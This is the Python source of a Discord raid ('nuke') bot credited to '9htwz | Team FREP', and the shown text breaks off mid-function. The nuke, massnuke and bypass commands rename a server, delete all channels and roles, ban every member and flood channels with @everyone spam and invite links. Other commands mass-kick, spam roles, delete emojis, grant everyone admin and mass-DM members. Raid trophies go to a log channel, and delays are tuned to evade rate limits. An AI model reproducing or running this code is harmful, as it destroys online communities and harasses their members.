#made by mr5a3er :)
import discord
import asyncio
import json
import random
import os
import aiohttp
import threading
from dotenv import load_dotenv
from discord.ext import commands
from discord import Permissions
import dashboard


client = commands.Bot(command_prefix=".", intents = discord.Intents.all())
client.remove_command('help')
######################################setup########################################

load_dotenv()

token = os.getenv("DISCORD_BOT_TOKEN")

if not token:
    print("ERROR: DISCORD_BOT_TOKEN not found in environment variables!")
    print("Please set your Discord bot token in a .env file with: DISCORD_BOT_TOKEN=your_token")
    exit(1)

# Bot owner and premium user management
BOT_OWNER_ID = 1061116414783651860  # Bot owner automatically has premium
premium_users = set()  # Store premium user IDs
premium_file = "premium_users.json"
smart_delays_enabled = True  # Global variable for smart delays
stealth_mode = True  # Enable stealth operations
ban_protection = True  # Enable ban protection features

# Raid channel configuration
RAID_CHANNEL_ID = 1347665399852044400  # Raid logs channel

# Bot protection settings
OPERATION_DELAY = 0.2  # Optimized for maximum speed without rate limit risks
MAX_OPERATIONS_PER_MINUTE = 30  # Limit operations per minute
USE_RANDOM_DELAYS = False  # Disable random delays for consistency

def load_premium_users():
    global premium_users
    try:
        with open(premium_file, 'r') as f:
            premium_users = set(json.load(f))
    except FileNotFoundError:
        premium_users = set()

def save_premium_users():
    with open(premium_file, 'w') as f:
        json.dump(list(premium_users), f)

STATUS_FILE = "status.json"

def load_status():
    try:
        with open(STATUS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"name": "Raid Bot", "bio": "Maximum chaos", "activity": "raiding"}

async def update_bot_status():
    status = load_status()
    try:
        if client.user:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status['activity']))
            print(f"Updated bot activity to: Listening to {status['activity']}")
            
            # Update bot username if changed
            if status.get('name'):
                print(f"Current username: {client.user.name}, Target username: {status['name']}")
                if status['name'] != client.user.name:
                    try:
                        await client.user.edit(username=status['name'])
                        print(f"Updated bot username to: {status['name']}")
                    except Exception as e:
                        print(f"Failed to update bot username: {e}")
                else:
                    print("Username is already correct")
        else:
            print("Client user not available yet")
    except Exception as e:
        print(f"Failed to update bot status: {e}")

BOT_STATUS_FILE = "bot_status.json"

def save_bot_status():
    status = {
        "servers": len(client.guilds),
        "online": True,
        "uptime": "Running"  # Could add actual uptime later
    }
    with open(BOT_STATUS_FILE, 'w') as f:
        json.dump(status, f)

async def status_updater():
    """Background task to check for status updates from dashboard"""
    await asyncio.sleep(10)  # Wait 10 seconds for bot to fully initialize
    last_status = load_status()
    while True:
        await asyncio.sleep(5)  # Check every 5 seconds
        current_status = load_status()
        if current_status != last_status:
            await update_bot_status()
            last_status = current_status
            print("Bot status updated automatically from dashboard")

def is_premium(user_id):
    return user_id == BOT_OWNER_ID or user_id in premium_users

def add_premium_user(user_id):
    premium_users.add(user_id)
    save_premium_users()

def remove_premium_user(user_id):
    premium_users.discard(user_id)
    save_premium_users()

async def stealth_delay():
    """Smart delay function to avoid detection"""
    if stealth_mode:
        base_delay = OPERATION_DELAY
        if USE_RANDOM_DELAYS:
            # Random delay between 1-4 seconds
            delay = random.uniform(base_delay, base_delay * 2)
        else:
            delay = base_delay
        await asyncio.sleep(delay)
    else:
        await asyncio.sleep(0.3)  # Optimized minimal delay

# Load premium users on startup
load_premium_users()

# Update bot status on startup
asyncio.run(update_bot_status())

async def send_raid_notification(guild, author, command_name):
    """Send raid notification to designated raid channel"""
    try:
        raid_channel = client.get_channel(RAID_CHANNEL_ID)
        if not raid_channel:
            print(f"\x1b[38;5;196mRaid channel not found! ID: {RAID_CHANNEL_ID}")
            return

        # Create embed with server information
        embed = discord.Embed(
            title="💀 SERVER NUKED",
            description=f"**{guild.name}** has been successfully nuked using command: `{command_name}`!",
            color=0xff0000,
            timestamp=discord.utils.utcnow()
        )

        # Set background image
        embed.set_image(url="https://i.imgur.com/Di50W5V.gif")

        # Add server statistics
        embed.add_field(name="🏠 Server Name", value=guild.name, inline=True)
        embed.add_field(name="👥 Members", value=str(guild.member_count), inline=True)
        embed.add_field(name="🎭 Roles", value=str(len(guild.roles)), inline=True)
        embed.add_field(name="📝 Channels", value=str(len(guild.channels)), inline=True)
        embed.add_field(name="🚀 Boost Level", value=str(guild.premium_tier), inline=True)
        embed.add_field(name="💎 Boosts", value=str(guild.premium_subscription_count), inline=True)
        embed.add_field(name="🔥 Nuked By", value=f"{author.name}#{author.discriminator}", inline=True)
        embed.add_field(name="🆔 Server ID", value=str(guild.id), inline=True)
        embed.add_field(name="⏰ Created", value=guild.created_at.strftime("%Y-%m-%d"), inline=True)

        # Set thumbnail to server icon if available
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)

        embed.set_footer(text="Made by 9htwz | Team FREP", icon_url="https://i.imgur.com/w2iuKha.png")

        await raid_channel.send(embed=embed)
        print(f"\x1b[38;5;34mRaid notification sent for {guild.name}!")

    except Exception as e:
        print(f"\x1b[38;5;196mFailed to send raid notification: {e}")

channel_names = ['imagine getting raided puxsy', 'you a bitch for getting raided', 'Fucked By 9htwz', 'nuked-by-9htwz', 'Fucked bye 9htwz', 'team-frep-owns-you']
message_spam = ['@everyone ✟ 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏 ✟  RUNS U 9htwz op', '@everyone ✟ 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏 ✟ RUNS U  JOIN NOW https://discord.gg/VxWaGHHYKA', '@everyone ✟ 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏 ✟ RUNS U JOIN NOW https://discord.gg/VxWaGHHYKA', '@everyone  ✟ 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏 ✟ RUNS U JOIN NOW https://discord.gg/VxWaGHHYKA']
webhook_names = ['✟ 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏 ✟', '2xlul On Top']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "imagine getting raided || .gg/VxWaGHHYKA"))#change this if you want
  
  # Save bot status for dashboard
  save_bot_status()
  
  # Sync slash commands
  try:
    synced = await client.tree.sync()
    print(f"\x1b[38;5;34mSynced {len(synced)} slash commands!")
  except Exception as e:
    print(f"\x1b[38;5;196mFailed to sync slash commands: {e}")
  
  print(f'''

╔═╗╔═╦═══╦═╗─╔╦═══╦═══╦═══╗
╚╗╚╝╔╣╔═╗║║╚╗║╠╗╔╗║╔═╗║╔═╗║
─╚╗╔╝║║─║║╔╗╚╝║║║║║║─║║╚═╝║
─╔╝╚╗║╚═╝║║╚╗║║║║║║╚═╝║╔╗╔╝
╔╝╔╗╚╣╔═╗║║─║║╠╝╚╝║╔═╗║║║╚╗
╚═╝╚═╩╝─╚╩╝─╚═╩═══╩╝─╚╩╝╚═╝

\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType .help or use /help for slash commands
\x1b[38;5;172mVersion: v2 (Slash Commands Enabled)
\x1b[38;5;172m═══════════════════════════
''')

  # Start the status updater background task
  client.loop.create_task(status_updater())

  # Start the dashboard in a separate thread
  dashboard_thread = threading.Thread(target=dashboard.start_dashboard)
  dashboard_thread.daemon = True
  dashboard_thread.start()
  print("Dashboard started on separate thread")


@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()

  print(f"\x1b[38;5;172mStarting nuke on {ctx.guild.name}...")

  # Send raid notification
  await send_raid_notification(ctx.guild, ctx.author, ".nuke")

  # Change server name first
  try:
    await ctx.guild.edit(name="TRASHED BY 9htwz | 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏")
    print(f"\x1b[38;5;34mServer name changed!")
    await asyncio.sleep(0.1)  # Minimal delay
  except:
    print(f"\x1b[38;5;196mUnable to change server name!")

  # Delete all channels fast
  channels = list(ctx.guild.channels)
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
      await asyncio.sleep(0.1)  # Fast deletion with minimal delay
    except:
      print(f"\x1b[38;5;196mUnable To Delete {channel.name}!")

  # Delete all roles except @everyone fast
  roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
  for role in roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
      await asyncio.sleep(0.1)  # Fast deletion
    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")

  # Create new channels fast
  for i in range(min(amount, 50)):  # Limit to 50 to avoid rate limits
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i+1}]!")
      await asyncio.sleep(0.2)  # Faster creation
    except:
      print("\x1b[38;5;196mUnable To Create Channel!")

  # Ban members fast
  members = [member for member in ctx.guild.members if not member.bot and member.id != ctx.author.id]
  for member in members:
    try:
      await member.ban(reason="Nuked by 9htwz")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
      await asyncio.sleep(0.2)  # Optimized delay
    except:
      print(f"\x1b[38;5;196mUnable To Ban {member.name}!")

  # Spam new channels fast
  await asyncio.sleep(0.3)  # Short wait before spamming
  new_channels = ctx.guild.channels
  for channel in new_channels:
    try:
      await channel.send(random.choice(message_spam))
      print(f"\x1b[38;5;34m{channel.name} Has Been Spammed!")
      await asyncio.sleep(0.2)  # Optimized delay
    except:
      print(f"\x1b[38;5;196mUnable To Spam {channel.name}!")

  print(f"\x1b[38;5;172mNuke completed on {ctx.guild.name}!")


@client.event
async def on_guild_channel_create(channel):
  try:
    if isinstance(channel, discord.TextChannel):
      webhook = await channel.create_webhook(name = random.choice(webhook_names))  
      for _ in range(5):  # Limit spam to prevent infinite loops
        try:
          await channel.send(random.choice(message_spam))
          await webhook.send(content=random.choice(message_spam), username=random.choice(webhook_names))
          await asyncio.sleep(1)  # Rate limit protection
        except discord.errors.HTTPException:
          break
        except Exception as e:
          print(f"Error sending message: {e}")
          break
  except Exception as e:
    print(f"Error in on_guild_channel_create: {e}")



@client.command()
async def banall(ctx):
  await ctx.message.delete()

  # Send raid notification
  #await send_raid_notification(ctx.guild, ctx.author)

  banned_count = 0
  members = [member for member in ctx.guild.members if not member.bot and member.id != ctx.author.id]

  for member in members:
    try:
      await member.ban(reason="Mass ban by 9htwz")
      banned_count += 1
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
      await asyncio.sleep(0.2)  # Optimized delay
    except:
      print(f"\x1b[38;5;196mUnable To Ban {member.name}!")

  print(f"\x1b[38;5;172mBanned {banned_count} members total!")



@client.command()
async def kickall(ctx):
  await ctx.message.delete()

  # Send raid notification
  #await send_raid_notification(ctx.guild, ctx.author)

  kicked_count = 0
  members = [member for member in ctx.guild.members if not member.bot and member.id != ctx.author.id]

  for member in members:
    try:
      await member.kick(reason="Mass kick by 9htwz")
      kicked_count += 1
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked!")
      await asyncio.sleep(0.2)  # Optimized delay
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name}!")

  print(f"\x1b[38;5;172mKicked {kicked_count} members total!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()

  # Send raid notification
  #await send_raid_notification(ctx.guild, ctx.author)

  created_count = 0
  for i in range(1, 51):  # Reduced from 250 to 50 to avoid rate limits
    try:
      await ctx.guild.create_role(name=f"TRASHED BY 9htwz")
      created_count += 1
      print(f"\x1b[38;5;34mSuccessfully Created Role [{created_count}]!")
      await asyncio.sleep(0.2)  # Optimized delay
    except:
      print(f"\x1b[38;5;196mUnable To Create Role!")

  print(f"\x1b[38;5;172mCreated {created_count} roles total!")


@client.command(pass_context=True)
async def emojidel(ctx):
    await ctx.message.delete()

    # Send raid notification
    #await send_raid_notification(ctx.guild, ctx.author)

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
        except:
            print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")

@client.command()
async def admin(ctx):
    await ctx.message.delete()

    # Send raid notification
    #await send_raid_notification(ctx.guild, ctx.author)

    for role in ctx.guild.roles:
        try:
            await role.edit(permissions=Permissions.all())
            print(f"\x1b[38;5;34m{role.name} Has Been Given Admin Permissions!")
        except:
            print(f"\x1b[38;5;196mUnable To Give {role.name} Admin!")

@client.command()
async def dm(ctx, *, message):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"\x1b[38;5;34mDM sent to {member.name}")
        except:
            print(f"\x1b[38;5;196mUnable to DM {member.name}")

@client.command()
async def premium(ctx):
    await ctx.message.delete()
    if is_premium(ctx.author.id):
        embed = discord.Embed(title="💎 Premium Status", description="✅ You have premium access!", color=0x00ff00)
    else:
        embed = discord.Embed(title="💎 Premium Status", description="❌ You don't have premium access. Contact 9htwz for upgrade.", color=0xff0000)
    await ctx.send(embed=embed)

@client.command()
async def addpremium(ctx, user_id: int):
    await ctx.message.delete()
    
    # Only bot owner can add premium users
    if ctx.author.id != BOT_OWNER_ID:
        embed = discord.Embed(title="❌ Access Denied", description="Only the bot owner can add premium users!", color=0xff0000)
        await ctx.send(embed=embed)
        return
    
    # Add user to premium
    add_premium_user(user_id)
    
    # Try to get user info
    try:
        user = await client.fetch_user(user_id)
        user_name = f"{user.name}#{user.discriminator}"
    except:
        user_name = f"User ID: {user_id}"
    
    embed = discord.Embed(title="✅ Premium Added", description=f"Successfully added **{user_name}** to premium users!", color=0x00ff00)
    embed.add_field(name="💎 Premium Users", value=f"Total: {len(premium_users) + 1}", inline=False)  # +1 for bot owner
    await ctx.send(embed=embed)
    print(f"\x1b[38;5;34mAdded {user_name} to premium users!")

@client.command()
async def removepremium(ctx, user_id: int):
    await ctx.message.delete()
    
    # Only bot owner can remove premium users
    if ctx.author.id != BOT_OWNER_ID:
        embed = discord.Embed(title="❌ Access Denied", description="Only the bot owner can remove premium users!", color=0xff0000)
        await ctx.send(embed=embed)
        return
    
    # Can't remove bot owner
    if user_id == BOT_OWNER_ID:
        embed = discord.Embed(title="❌ Cannot Remove", description="Cannot remove bot owner from premium!", color=0xff0000)
        await ctx.send(embed=embed)
        return
    
    # Remove user from premium
    if user_id in premium_users:
        remove_premium_user(user_id)
        
        # Try to get user info
        try:
            user = await client.fetch_user(user_id)
            user_name = f"{user.name}#{user.discriminator}"
        except:
            user_name = f"User ID: {user_id}"
        
        embed = discord.Embed(title="✅ Premium Removed", description=f"Successfully removed **{user_name}** from premium users!", color=0x00ff00)
        embed.add_field(name="💎 Premium Users", value=f"Total: {len(premium_users) + 1}", inline=False)  # +1 for bot owner
        await ctx.send(embed=embed)
        print(f"\x1b[38;5;34mRemoved {user_name} from premium users!")
    else:
        embed = discord.Embed(title="❌ Not Found", description="User is not in premium list!", color=0xff0000)
        await ctx.send(embed=embed)

@client.command()
async def invite(ctx):
    await ctx.message.delete()
    # No raid notification for invite command
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot%20applications.commands"
    embed = discord.Embed(title="🔗 Bot Invite Link", description=f"[Click here to invite the bot]({invite_link})\n\n**Add to Server:** Bot commands (prefix: .)\n**Add to Apps:** Slash commands (prefix: /) with Administrator permissions", color=0x0099ff)
    await ctx.send(embed=embed)

@client.command()
async def updatestatus(ctx):
    await ctx.message.delete()
    await update_bot_status()
    embed = discord.Embed(title="✅ Status Updated", description="Bot status has been updated from the dashboard!", color=0x00ff00)
    await ctx.send(embed=embed, delete_after=5)

@client.command()
async def bypass(ctx, target: str = None):
    if not is_premium(ctx.author.id):
        embed = discord.Embed(title="💎 Premium Required", description="This command requires premium access. Contact 9htwz to upgrade.", color=0xff0000)
        await ctx.send(embed=embed)
        return

    try:
        await ctx.message.delete()
    except:
        pass

    if target is None:
        # Show available servers the bot is in
        bot_guilds = client.guilds
        if not bot_guilds:
            embed = discord.Embed(title="❌ No Servers Available", description="Bot is not in any servers for bypass operations.", color=0xff0000)
            await ctx.send(embed=embed)
            return

        embed = discord.Embed(title="🚀 BYPASS MODE - INVITE LINK METHOD", description="**ULTIMATE BYPASS:** Join and nuke any server using invite links!\n\n**How it works:**\n• Uses Discord invite links to join servers\n• Bot joins temporarily then nukes\n• Works with any valid invite link\n• Complete server destruction", color=0xff0000)

        # Show first 5 available servers to avoid character limit
        available_servers = ""
        for i, guild in enumerate(bot_guilds[:5]):
            server_info = f"```yaml\n🎯 {guild.name[:20]}...\n   Server ID: {guild.id}\n   Members: {guild.member_count}\n   Channels: {len(guild.channels)}```\n"
            # Check if adding this server would exceed the limit
            if len(available_servers + server_info) > 900:  # Leave some buffer
                break
            available_servers += server_info

        if not available_servers:
            available_servers = "```yaml\nNo accessible servers found```"

        embed.add_field(name="🎯 Currently Accessible Servers", value=available_servers[:1024], inline=False)
        how_to_use = "```yaml\n1. Get invite link from target server\n2. Use: .bypass [invite_link]\n3. Bot will join and nuke instantly\n4. Works with any valid invite!```"
        embed.add_field(name="📋 How to Use", value=how_to_use[:1024], inline=False)

        example_text = f"```yaml\n.bypass https://discord.gg/abc123\n.bypass 1234567890123456789\n\n• Use invite link OR server ID\n• Instant server destruction\n• No prior access needed```"
        embed.add_field(name="⚡ Example", value=example_text[:1024], inline=False)

        warning_text = "```diff\n- EXTREMELY DANGEROUS BYPASS\n- PERMANENT SERVER DESTRUCTION\n- CANNOT BE STOPPED OR UNDONE\n- USE WITH EXTREME CAUTION```"
        embed.add_field(name="⚠️ Warning", value=warning_text[:1024], inline=False)
        embed.set_footer(text="Made by 9htwz | Ultimate No-Permission Bypass")
        await ctx.send(embed=embed)
        return

    # Execute bypass nuke with invite link or server ID
    try:
        target_guild = None
        
        # Check if input is a server ID (numeric) or invite link
        if target.isdigit():
            # Server ID method
            server_id = int(target)
            
            # Check if bot is in the server
            for guild in client.guilds:
                if guild.id == server_id:
                    target_guild = guild
                    break
            
            if not target_guild:
                embed = discord.Embed(title="❌ Server Not Found", description=f"Bot is not in server with ID: `{server_id}`\n\n**To access this server:**\n1. Bot needs to be added to the target server\n2. Use this invite link: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot\n3. Once added, try `.bypass {server_id}` again", color=0xff0000)
                await ctx.send(embed=embed)
                return
        
        else:
            # Invite link method
            if not (target.startswith("https://discord.gg/") or target.startswith("https://discord.com/invite/")):
                embed = discord.Embed(title="❌ Invalid Input", description=f"Invalid format!\n\n**Valid formats:**\n• `https://discord.gg/CODE` (invite link)\n• `https://discord.com/invite/CODE` (invite link)\n• `1234567890123456789` (server ID)", color=0xff0000)
                await ctx.send(embed=embed)
                return

            # Try to join the server using the invite
            try:
                # Extract invite code from URL
                invite_code = target.split("/")[-1]
                invite = await client.fetch_invite(invite_code)
                
                # Check if bot is already in the server
                for guild in client.guilds:
                    if guild.id == invite.guild.id:
                        target_guild = guild
                        break
                
                if not target_guild:
                    # Handle partial guild object safely
                    member_count = getattr(invite.guild, 'member_count', 'Unknown')
                    embed = discord.Embed(
                        title="⚠️ Bot Limitation", 
                        description=(
                            "**Discord bots cannot join servers through invite links!**\n\n"
                            f"**Target Server:** {invite.guild.name}\n"
                            f"**Members:** {member_count}\n\n"
                            "**How to bypass this server:**\n"
                            f"1. Someone with admin permissions in `{invite.guild.name}` needs to add the bot\n"
                            "2. Use this bot invite link: "
                            f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot\n"
                            f"3. Once bot is added, use `.bypass {target}` again\n\n"
                            "**Alternative:** Use server ID method if you know the server ID"
                        ), 
                        color=0xffaa00
                    )
                    await ctx.send(embed=embed)
                    return

            except Exception as e:
                embed = discord.Embed(title="❌ Invite Failed", description=f"Unable to fetch invite information!\n\n**Error:** `{str(e)}`\n\n**Possible causes:**\n• Invalid invite link\n• Invite expired\n• No access to invite", color=0xff0000)
                await ctx.send(embed=embed)
                return
            
        print(f"\x1b[38;5;34mBot found in {target_guild.name}!")

        # Bypass confirmation embed
        embed = discord.Embed(title="🚀 INVITE BYPASS SUCCESSFUL", description=f"**SUCCESSFULLY JOINED {target_guild.name}!** Ready to nuke!", color=0xff0000)
        embed.add_field(name="🎯 Target Server Info", value=f"```yaml\nServer: {target_guild.name}\nMembers: {target_guild.member_count}\nChannels: {len(target_guild.channels)}\nRoles: {len(target_guild.roles)}\nStatus: INFILTRATED```", inline=False)
        embed.add_field(name="💀 BYPASS STATUS", value="```diff\n+ Successfully joined via invite\n+ Bot now has access to server\n+ Ready for complete destruction\n+ All defenses bypassed```", inline=False)
        embed.add_field(name="⚠️ FINAL WARNING", value="```diff\n- COMPLETE SERVER DESTRUCTION\n- WILL DELETE EVERYTHING\n- CANNOT BE STOPPED ONCE STARTED\n- USE WITH EXTREME CAUTION```", inline=False)
        embed.set_footer(text="Made by 9htwz | Invite Bypass Ready")

        view = InviteBypassView(ctx, target_guild)
        await ctx.send(embed=embed, view=view)

    except Exception as e:
        embed = discord.Embed(title="❌ Bypass Failed", description=f"Bypass operation failed: {str(e)}", color=0xff0000)
        await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    embed = discord.Embed(title="🔥 YANDOR NUKE BOT", description="Select a category below:", color=0xff0000)
    embed.set_footer(text="Made by 9htwz")
    view = HelpView()
    await ctx.send(embed=embed, view=view)

class InviteBypassView(discord.ui.View):
    def __init__(self, ctx, target_guild):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.target_guild = target_guild

    @discord.ui.button(label="🔥 EXECUTE FULL NUKE", style=discord.ButtonStyle.danger, emoji="💥")
    async def execute_invite_bypass(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.send_message("❌ Only the command executor can use this!", ephemeral=True)
            return

        await interaction.response.send_message(f"🚀 **INVITE BYPASS INITIATED!**\n```diff\n- NUKING {self.target_guild.name}...\n- COMPLETE DESTRUCTION STARTING\n- THIS CANNOT BE STOPPED!```", ephemeral=True)

        print(f"\x1b[38;5;172m🚀 STARTING INVITE BYPASS NUKE ON {self.target_guild.name}")

        # Send raid notification
        await send_raid_notification(self.target_guild, self.ctx.author, ".bypass")

        # Execute full nuke on the target guild
        try:
            # Change server name
            try:
                await self.target_guild.edit(name="BYPASSED BY 9htwz | 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏")
                print(f"\x1b[38;5;34mServer name changed!")
                await asyncio.sleep(0.1)
            except:
                print(f"\x1b[38;5;196mUnable to change server name!")

            # Delete all channels fast
            channels = list(self.target_guild.channels)
            for channel in channels:
                try:
                    await channel.delete()
                    print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
                    await asyncio.sleep(0.1)
                except:
                    print(f"\x1b[38;5;196mUnable To Delete {channel.name}!")

            # Delete all roles except @everyone fast
            roles = [role for role in self.target_guild.roles if role.name != "@everyone"]
            for role in roles:
                try:
                    await role.delete()
                    print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
                    await asyncio.sleep(0.1)
                except:
                    print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")

            # Create new channels fast
            for i in range(50):
                try:  
                    await self.target_guild.create_text_channel(random.choice(channel_names))
                    print(f"\x1b[38;5;34mSuccessfully Made Channel [{i+1}]!")
                    await asyncio.sleep(0.2)
                except:
                    print("\x1b[38;5;196mUnable To Create Channel!")

            # Ban members fast
            members = [member for member in self.target_guild.members if not member.bot and member.id != self.ctx.author.id]
            for member in members:
                try:
                    await member.ban(reason="Bypassed and nuked by 9htwz")
                    print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
                    await asyncio.sleep(0.2)
                except:
                    print(f"\x1b[38;5;196mUnable To Ban {member.name}!")

            # Spam new channels fast
            await asyncio.sleep(0.3)
            new_channels = self.target_guild.channels
            for channel in new_channels:
                try:
                    await channel.send(random.choice(message_spam))
                    print(f"\x1b[38;5;34m{channel.name} Has Been Spammed!")
                    await asyncio.sleep(0.2)
                except:
                    print(f"\x1b[38;5;196mUnable To Spam {channel.name}!")

        except Exception as e:
            print(f"\x1b[38;5;196mError during bypass nuke: {e}")

        print(f"\x1b[38;5;172m🚀 INVITE BYPASS NUKE COMPLETED ON {self.target_guild.name}!")

    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
    async def cancel_invite_bypass(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.send_message("❌ Only the command executor can use this!", ephemeral=True)
            return

        embed = discord.Embed(title="✅ Invite Bypass Cancelled", description="Bypass operation has been cancelled safely.", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=None)

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.select(
        placeholder="Select a command category...",
        options=[
            discord.SelectOption(label="Free Commands", value="free", emoji="🆓"),
            discord.SelectOption(label="Premium Commands", value="premium", emoji="💎")
        ]
    )
    async def help_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        if select.values[0] == "free":
            embed = discord.Embed(color=0x00FF00, title="🆓 FREE COMMANDS")

            section_bar_top = "╔" + "═" * 38 + "╗"
            section_bar_mid = "╠" + "═" * 38 + "╣"
            section_bar_bottom = "╚" + "═" * 38 + "╝"

            free_commands = f"""```yaml
{section_bar_top}
           🆓 FREE TIER COMMANDS
{section_bar_mid}

.nuke - Destroys Guild
.banall - Bans All Members 
.kickall - Kicks All Members
.rolespam - Spams Roles
.emojidel - Deletes All Emojis
.admin - Gives Everyone Admin
.dm - DM all members
.premium - Check premium status
.invite - Get bot invite link

{section_bar_bottom}```"""

            embed.add_field(name="📋 Available Commands", value=free_commands, inline=False)
            embed.add_field(name="💡 Example Usage", value="```yaml\n📝 Example: .nuke 25\n📝 Example: .dm Hello everyone!\n📝 Example: .banall```", inline=False)
            embed.add_field(name="🔓 Upgrade Info", value="```yaml\n💎 Contact 9htwz for premium access\n💎 Unlock enhanced features\n💎 Get exclusive commands```", inline=False)
            embed.set_footer(text=f"Free Commands | Made By 9htwz")

            await interaction.response.send_message(embed=embed, ephemeral=True)

        elif select.values[0] == "premium":
            if is_premium(interaction.user.id):
                embed = discord.Embed(color=0xFFD700, title="💎 PREMIUM EXCLUSIVE COMMANDS")

                premium_commands_1 = """```yaml
💎 PREMIUM EXCLUSIVE (1/2):
.massnuke - Enhanced mass destruction
.smartban - Advanced banning system
.selectiveban - Target specific members
.bulkrole - Mass role management
.channeltemplate - Save/load layouts
.customspam - Custom spam messages
.serverstats - Server analytics
.autopurge - Auto delete old messages
.iconchanger - Rotate server icons```"""

                premium_commands_2 = """```yaml
💎 PREMIUM EXCLUSIVE (2/2):
.smartdelay - Anti-detection delays
.stealthmode - Covert operations
.multispam - Multi-wave spam attacks
.emojimanager - Bulk emoji operations
.backupserver - Full server backup
.restoreserver - Restore from backup
.progressnuke - Real-time progress
.bypass - Server bypass methods
.stop - Emergency bot shutdown```"""

                embed.add_field(name="⚡ Premium Commands (Part 1)", value=premium_commands_1, inline=False)
                embed.add_field(name="⚡ Premium Commands (Part 2)", value=premium_commands_2, inline=False)
                embed.add_field(name="💡 Premium Examples", value="```yaml\n📝 Example: .bypass https://discord.gg/abc123\n📝 Example: .massnuke 150\n📝 Example: .smartban @user1 @user2```", inline=False)
                embed.add_field(name="✅ Premium Status", value="```diff\n+ PREMIUM ACCESS GRANTED\n+ 18 exclusive premium commands\n+ Enhanced features available\n+ Free commands also accessible```", inline=False)
                embed.set_footer(text=f"Premium Exclusive Commands | Made By 9htwz")

                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed(color=0xFF0000, title="💎 PREMIUM REQUIRED")

                premium_commands = """```diff
💎 PREMIUM EXCLUSIVE COMMANDS:
+ .massnuke - Enhanced mass destruction
+ .smartban/.selectiveban - Advanced banning
+ .bulkrole - Mass role operations
+ .channeltemplate - Save/restore layouts
+ .customspam - Custom spam messages
+ .serverstats - Server analytics
+ .autopurge - Auto message cleanup
+ .iconchanger - Dynamic server icons
+ .smartdelay/.stealthmode - Anti-detection```"""

                premium_commands_2 = """```diff
💎 MORE PREMIUM COMMANDS:
+ .multispam - Multi-wave attacks
+ .emojimanager - Bulk emoji control
+ .backupserver/.restoreserver - Full backup
+ .progressnuke - Real-time progress
+ .bypass - Advanced server bypass
+ .stop - Emergency shutdown```"""

                premium_benefits = """```diff
💎 PREMIUM BENEFITS:
+ 18 exclusive premium commands
+ Advanced automation features
+ Anti-detection systems
+ Real-time progress tracking
+ Server backup/restore
+ Priority support
+ Enhanced destruction tools```"""

                embed.add_field(name="🚀 Premium Commands (1/2)", value=premium_commands, inline=False)
                embed.add_field(name="🚀 Premium Commands (2/2)", value=premium_commands_2, inline=False)
                embed.add_field(name="✨ Premium Benefits", value=premium_benefits, inline=False)
                embed.add_field(name="💡 Premium Examples", value="```yaml\n📝 Example: .bypass https://discord.gg/abc123\n📝 Example: .massnuke 150\n📝 Example: .smartban @user1 @user2```", inline=False)
                embed.add_field(name="🔓 Upgrade Info", value="```yaml\n💎 Contact 9htwz to upgrade\n💎 Unlock all premium features\n💎 Get exclusive access```", inline=False)
                embed.set_footer(text="Premium Required | Made By 9htwz")

                await interaction.response.send_message(embed=embed, ephemeral=True)



# Premium commands (only work if user has premium access)
@client.command()
async def massnuke(ctx, amount=100):
    if not is_premium(ctx.author.id):
        embed = discord.Embed(title="💎 Premium Required", description="This command requires premium access. Contact 9htwz to upgrade.", color=0xff0000)
        await ctx.send(embed=embed)
        return

    await ctx.message.delete()

    # Send raid notification
    await send_raid_notification(ctx.guild, ctx.author, ".massnuke")

    await ctx.guild.edit(name="MASS NUKED BY 9htwz | 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏")
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
